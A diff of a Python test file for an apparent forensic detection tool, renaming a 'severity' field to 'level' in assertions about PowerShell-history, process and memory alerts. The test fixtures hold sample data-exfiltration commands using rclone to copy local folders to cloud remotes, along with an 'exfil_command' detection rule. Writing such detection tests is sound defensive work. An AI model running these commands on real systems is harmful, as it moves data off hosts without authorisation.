@@ -99,7 +99,7 @@ def test_windows_history_and_liveresponse(tmp_path):
                     "CommandLine": "rclone.exe sync D:\\share remote:bucket"}), encoding="utf-8")
     out = tmp_path / "out"
     W.run(_ctx(tmp_path, out))
-    rows = {(r["source"], r["severity"]) for r in _read(out)}
+    rows = {(r["source"], r["level"]) for r in _read(out)}
     assert rows == {("powershell_history", "high"), ("process", "medium")}
     # a VSS snapshot reads its own history, never the live host's processes
     out2 = tmp_path / "out2"
@@ -151,12 +151,12 @@ def test_memory_rows_become_alerts(tmp_path):
           [[0, 700, "rclone.exe", "rclone.exe copy C:\\Data mega:x"]])
     M.run(_ctx(unit, mem))                               # where mem_findings reads it from
     rows = _read(mem)
-    assert [(r["user"], r["severity"]) for r in rows] == [("pid 700 rclone.exe", "high")]
+    assert [(r["user"], r["level"]) for r in rows] == [("pid 700 rclone.exe", "high")]
     out = tmp_path / "out"
     F.run(_ctx(unit, out))
     with open(out / "alert_mem.csv", encoding="utf-8", newline="") as fh:
         alerts = [a for a in csv.DictReader(fh) if a["rule"] == "exfil_command"]
-    assert [(a["pid"], a["severity"]) for a in alerts] == [("700", "high")]
+    assert [(a["pid"], a["level"]) for a in alerts] == [("700", "high")]
 
 
 def test_the_bundled_asset_is_the_generators_output_shape():
